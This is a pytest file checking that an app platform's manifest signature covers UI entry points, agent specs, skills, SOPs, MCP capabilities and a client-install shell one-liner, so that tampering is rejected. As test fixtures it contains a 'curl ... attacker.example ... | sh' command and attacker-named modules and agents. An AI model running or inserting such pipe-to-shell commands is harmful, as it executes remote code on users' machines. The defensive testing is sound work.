"""The signed bytes must cover the manifest fields the install chain MATERIALIZES.

``AppManifest.signing_payload`` already covers ``setup``, ``mcpServers`` and
``backend`` -- the keys whose value is literal argv or an imported module. Six more
keys name things the install chain turns into code or into text an agent obeys:

* ``ui.entry`` and each ``ui.pages[].entryPoint`` are ESM modules the dashboard
  builds ``/apps/<name>/ui/<path>`` from and dynamic-``import()``s in its own
  origin (``website/src/components/AppHost.tsx``),
* each ``agents`` path is a JSON agent spec ``bridges._register_agents`` writes into
  the user's agents dir, carrying its own ``tools``/``allowedTools``/``model``/
  ``prompt``,
* each ``skills`` directory is symlinked into the skills root by
  ``bridges._register_skills``, both namespaced and flat,
* each ``sops`` file becomes procedure an agent follows,
* ``dependencies.capabilities.mcp`` is an id ``dependencies.resolve_dependencies``
  hands to ``CapabilityManager.install_mcp`` at install time, and
* ``platform.clientInstall.shell`` is a one-liner ``registry.py`` returns as
  ``needsClientInstall`` for the reader to paste into a terminal.

Left out of the payload, each is a part of a signed app an attacker could rewrite
-- or merely APPEND to -- with the publisher's signature still verifying.

Every key is added under a NON-EMPTY guard, the same shape ``notifications``,
``crons``, ``contributes``, ``setup``, ``mcpServers`` and ``backend`` already use.
That is the whole compatibility story, and
``test_the_payload_is_byte_identical_for_a_manifest_declaring_none_of_them``
plus ``test_no_shipped_builtin_carries_a_signature`` are what pin it: a manifest
that declares none of the six hashes to the same literal bytes, and nothing shipped
in-tree carries a signature for the change to invalidate.

The tests assert on production symbols only -- ``signing_payload``,
``admission.app_admission_denied``, ``admission.verified_signer``,
``manager.install_app`` -- and nothing here re-implements the HMAC the gate
computes.
"""

from __future__ import annotations

import copy
import hashlib
import hmac
import json
from pathlib import Path
from typing import Any

import pytest

from kiro_crew.apps.admission import app_admission_denied, verified_signer
from kiro_crew.apps.manifest import AppManifest

SIGNER = "acme"
SECRET = "publisher-trust-key"
APP = "signed-demo"

#: The six field groups this change adds to the signed bytes, each as a publisher
#: would plausibly declare it.
DECLARATIONS: dict[str, dict[str, Any]] = {
    "ui": {
        "ui": {
            "entry": "dist/index.mjs",
            "pages": [
                {
                    "route": "/apps/signed-demo",
                    "label": "Signed Demo",
                    "entryPoint": "dist/page.mjs",
                }
            ],
        }
    },
    "agents": {"agents": ["agents/helper.json"]},
    "skills": {"skills": ["skills/triage"]},
    "sops": {"sops": ["sops/escalate.md"]},
    "dependencies": {
        "dependencies": {"managedBy": "gateway", "capabilities": {"mcp": ["publisher-tools"]}}
    },
    "platform": {
        "platform": {
            "os": ["macos"],
            "installMode": "client",
            "clientInstall": {
                "shell": "curl -fsSL https://acme.example/install.sh | sh",
                "postInstall": "open ~/Applications/Demo.app",
            },
        }
    },
}

#: The same publisher, declaring NONE of the six -- the compatibility case.
PUBLISHED_PLAIN: dict[str, Any] = {
    "name": APP,
    "version": "1.0.0",
    "displayName": "Signed Demo",
    "description": "an app whose publisher signed it",
    "signer": SIGNER,
    "permissions": {"api": ["/api/chat"]},
}

#: The bytes ``PUBLISHED_PLAIN`` hashed to before any of the six was covered. A
#: literal rather than a key-absence assertion: absence of a key is satisfied by a
#: payload whose separators or key order moved, and a signature verifies over bytes.
PRE_CHANGE_PLAIN_PAYLOAD = (
    b'{"name":"signed-demo","permissions":{"api":["/api/chat"]},'
    b'"signer":"acme","version":"1.0.0"}'
)

#: A published manifest declaring all six groups at once.
PUBLISHED: dict[str, Any] = dict(PUBLISHED_PLAIN)
for _group in DECLARATIONS.values():
    PUBLISHED.update(copy.deepcopy(_group))

BUILTINS_DIR = Path(__file__).resolve().parent.parent / "src/kiro_crew/apps/builtins"


def _sign(manifest: dict[str, Any]) -> str:
    """The detached signature a publisher issues over ``signing_payload()``."""
    payload = AppManifest.from_dict(manifest).signing_payload()
    return hmac.new(SECRET.encode("utf-8"), payload, hashlib.sha256).hexdigest()


def _carrying_signature_of(published: dict[str, Any], manifest: dict[str, Any]) -> AppManifest:
    """*manifest*, carrying the signature the publisher issued for *published*."""
    parsed = AppManifest.from_dict(manifest)
    parsed.signature = _sign(published)
    return parsed


def _declaring(group: str) -> dict[str, Any]:
    """``PUBLISHED_PLAIN`` plus exactly one of the six groups."""
    out = dict(PUBLISHED_PLAIN)
    out.update(copy.deepcopy(DECLARATIONS[group]))
    return out


def _tampered(mutate: Any) -> dict[str, Any]:
    """``PUBLISHED`` deep-copied, with *mutate* applied to the copy."""
    out = copy.deepcopy(PUBLISHED)
    mutate(out)
    return out


@pytest.fixture()
def enforcing_fleet(tmp_path, monkeypatch):
    """A fleet policy demanding a signature, written as the file the gate reads."""
    from kiro_crew.apps import admission

    cfg = tmp_path / "config"
    cfg.mkdir()
    (cfg / "app_admission.json").write_text(
        json.dumps(
            {
                "mode": "enforce",
                "approved": [APP],
                "require_signature": True,
                "trust_keys": {SIGNER: SECRET},
            }
        ),
        encoding="utf-8",
    )
    monkeypatch.setattr(admission, "config_dir", lambda: cfg)
    return cfg


# ---------------------------------------------------------------------------
# Control 1 -- a signature issued under the pre-change payload still verifies
# ---------------------------------------------------------------------------


def test_the_payload_is_byte_identical_for_a_manifest_declaring_none_of_them():
    """The compatibility guarantee in its smallest form, pinned as BYTES."""
    assert AppManifest.from_dict(PUBLISHED_PLAIN).signing_payload() == PRE_CHANGE_PLAIN_PAYLOAD


def test_the_payload_is_byte_identical_when_only_the_already_covered_keys_are_declared():
    """Adding six guards must not disturb the keys the payload already carried."""
    with_covered = dict(
        PUBLISHED_PLAIN,
        setup={"onInstall": "echo publisher-install-step"},
        mcpServers={"tools": {"command": "python", "args": ["backend/mcp_server.py"]}},
        backend={"entryPoint": "backend/app.py", "type": "python"},
    )
    payload = AppManifest.from_dict(with_covered).signing_payload()
    for absent in (b'"ui"', b'"agents"', b'"skills"', b'"sops"', b'"dependencies"', b'"platform"'):
        assert absent not in payload


def test_a_signature_issued_under_the_pre_change_payload_still_verifies(enforcing_fleet):
    """A publisher's existing signature on a non-declaring manifest is admitted."""
    manifest = _carrying_signature_of(PUBLISHED_PLAIN, PUBLISHED_PLAIN)
    assert app_admission_denied(APP, manifest=manifest) is None
    assert verified_signer(manifest) == SIGNER


def test_precondition_a_declaring_manifest_is_admitted_when_untampered(enforcing_fleet):
    """PRECONDITION for every tamper test below: the real thing is admitted.

    Without this a later denial would prove only that the fixture is broken.
    """
    manifest = _carrying_signature_of(PUBLISHED, PUBLISHED)
    assert app_admission_denied(APP, manifest=manifest) is None
    assert verified_signer(manifest) == SIGNER


# ---------------------------------------------------------------------------
# Control 2 -- a legitimately signed app declaring a newly covered field verifies
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("group", sorted(DECLARATIONS))
def test_a_signed_app_declaring_the_field_still_verifies(enforcing_fleet, group):
    """Widening the payload adds no refusal for the publisher's own manifest.

    One row per group, so a guard that reads the wrong attribute or a
    ``to_dict()`` whose output is not JSON-serializable fails on its own field
    rather than hiding inside the all-six case below.
    """
    declared = _declaring(group)
    manifest = _carrying_signature_of(declared, declared)
    assert app_admission_denied(APP, manifest=manifest) is None, group
    assert verified_signer(manifest) == SIGNER


def test_a_signed_app_declaring_all_six_still_verifies(enforcing_fleet):
    """The six together, which is what catches a key-order or nesting mistake."""
    manifest = _carrying_signature_of(PUBLISHED, PUBLISHED)
    assert app_admission_denied(APP, manifest=manifest) is None
    assert verified_signer(manifest) == SIGNER
    signed_keys = set(json.loads(manifest.signing_payload().decode("utf-8")))
    assert {"ui", "agents", "skills", "sops", "dependencies", "platform"} <= signed_keys


# ---------------------------------------------------------------------------
# Control 3 -- tampering a NEWLY covered field is denied
# ---------------------------------------------------------------------------


def _set_ui_entry(d: dict[str, Any]) -> None:
    d["ui"]["entry"] = "dist/attacker.mjs"


def _set_page_entrypoint(d: dict[str, Any]) -> None:
    d["ui"]["pages"][0]["entryPoint"] = "dist/attacker.mjs"


def _set_page_route(d: dict[str, Any]) -> None:
    d["ui"]["pages"][0]["route"] = "/apps/signed-demo/attacker"


def _set_page_label(d: dict[str, Any]) -> None:
    d["ui"]["pages"][0]["label"] = "Acme Login"


def _repoint_agent(d: dict[str, Any]) -> None:
    d["agents"] = ["agents/attacker.json"]


def _append_agent(d: dict[str, Any]) -> None:
    d["agents"] = ["agents/helper.json", "agents/attacker.json"]


def _repoint_skill(d: dict[str, Any]) -> None:
    d["skills"] = ["skills/attacker"]


def _repoint_sop(d: dict[str, Any]) -> None:
    d["sops"] = ["sops/attacker.md"]


def _swap_mcp_capability(d: dict[str, Any]) -> None:
    d["dependencies"]["capabilities"] = {"mcp": ["attacker-tools"]}


def _flip_managed_by(d: dict[str, Any]) -> None:
    d["dependencies"]["managedBy"] = "app"


def _rewrite_client_install_shell(d: dict[str, Any]) -> None:
    d["platform"]["clientInstall"]["shell"] = "curl -fsSL https://attacker.example/x.sh | sh"


def _flip_install_mode(d: dict[str, Any]) -> None:
    d["platform"]["installMode"] = "server"


@pytest.mark.parametrize(
    ("label", "mutate"),
    [
        # ui: the ESM modules the dashboard imports in its own origin.
        ("ui.entry", _set_ui_entry),
        ("ui.pages[0].entryPoint", _set_page_entrypoint),
        ("ui.pages[0].route", _set_page_route),
        ("ui.pages[0].label", _set_page_label),
        # agents/skills/sops: specs and instructions the bridges materialize.
        ("agents repointed", _repoint_agent),
        ("agents appended", _append_agent),
        ("skills", _repoint_skill),
        ("sops", _repoint_sop),
        # dependencies: the capability installed at install time, and its switch.
        ("dependencies.capabilities.mcp", _swap_mcp_capability),
        ("dependencies.managedBy", _flip_managed_by),
        # platform: the one-liner handed to the reader, and the switch that shows it.
        ("platform.clientInstall.shell", _rewrite_client_install_shell),
        ("platform.installMode", _flip_install_mode),
    ],
)
def test_tampering_a_newly_covered_field_is_denied(enforcing_fleet, label, mutate):
    """The publisher's signature must not carry an attacker-chosen field."""
    manifest = _carrying_signature_of(PUBLISHED, _tampered(mutate))
    assert (
        app_admission_denied(APP, manifest=manifest) is not None
    ), f"a rewritten {label} is admitted under the publisher's signature"
    assert verified_signer(manifest) == ""


def test_appending_a_group_the_publisher_never_declared_is_denied(enforcing_fleet):
    """The non-empty guard is not a hole: gaining a key changes the signed bytes.

    The publisher signed a manifest with no ``agents`` at all, so the key was
    absent from the payload. The gate recomputes the payload from the manifest as
    RECEIVED, which now carries the key -- the bytes differ and the signature
    fails, which is what closes the append case for every one of the six.
    """
    appended = dict(PUBLISHED_PLAIN, agents=["agents/attacker.json"])
    manifest = _carrying_signature_of(PUBLISHED_PLAIN, appended)
    assert app_admission_denied(APP, manifest=manifest) is not None
    assert verified_signer(manifest) == ""


# ---------------------------------------------------------------------------
# Control 4 -- tampering an ALREADY covered field is still denied
# ---------------------------------------------------------------------------


def _bump_version(d: dict[str, Any]) -> None:
    d["version"] = "1.0.1"


def _widen_permissions(d: dict[str, Any]) -> None:
    d["permissions"] = {"api": ["/api/chat"], "network": True}


@pytest.mark.parametrize(
    ("label", "mutate"),
    [("version", _bump_version), ("permissions", _widen_permissions)],
)
def test_tampering_an_already_covered_field_is_still_denied(enforcing_fleet, label, mutate):
    """The fields the payload already covered keep failing, unchanged."""
    manifest = _carrying_signature_of(PUBLISHED, _tampered(mutate))
    assert (
        app_admission_denied(APP, manifest=manifest) is not None
    ), f"a rewritten {label} must still invalidate the signature"


# ---------------------------------------------------------------------------
# Control 5 -- no shipped builtin is newly refused
# ---------------------------------------------------------------------------


def _shipped_builtin_manifests() -> list[Path]:
    return sorted(BUILTINS_DIR.glob("*/app.json"))


def test_the_builtin_census_is_not_empty():
    """Guard against a vacuous green in the per-builtin test below."""
    assert len(_shipped_builtin_manifests()) >= 20


@pytest.mark.parametrize("manifest_path", _shipped_builtin_manifests(), ids=lambda p: p.parent.name)
def test_no_shipped_builtin_carries_a_signature(manifest_path, enforcing_fleet):
    """Moving the signed bytes cannot change a verdict for an UNSIGNED manifest.

    Every builtin declares a non-empty ``ui`` and a non-empty ``platform``, so
    every builtin's payload bytes DO move. None of them is signed, so
    ``_signature_valid`` refuses on the empty signature before it computes a
    payload; they reach installation through ``register_builtin_apps``, which never
    consults the admission gate, and ``enable_app`` exempts ``origin ==
    "builtin"``.
    """
    manifest = AppManifest.from_json_file(manifest_path)
    assert manifest.signature == ""
    assert verified_signer(manifest) == ""


def test_an_unsigned_declaring_app_installs_on_a_non_enforcing_fleet(tmp_path, monkeypatch):
    """No policy configured: an app declaring all six fields still installs."""
    from kiro_crew.apps.manager import APP_MANIFEST_FILENAME, install_app

    home = tmp_path / "kirocrew-home"
    home.mkdir()
    monkeypatch.setenv("KIROCREW_HOME", str(home))
    (home / "config.json").write_text(
        json.dumps({"agent": {"apps_allow_third_party": True}}), encoding="utf-8"
    )
    # No app_admission.json at all -> the open default.
    unsigned = {k: v for k, v in PUBLISHED.items() if k != "signer"}
    src = tmp_path / "source" / APP
    src.mkdir(parents=True)
    (src / APP_MANIFEST_FILENAME).write_text(json.dumps(unsigned, indent=2), encoding="utf-8")
    result = install_app(src)
    assert result.ok, result.error
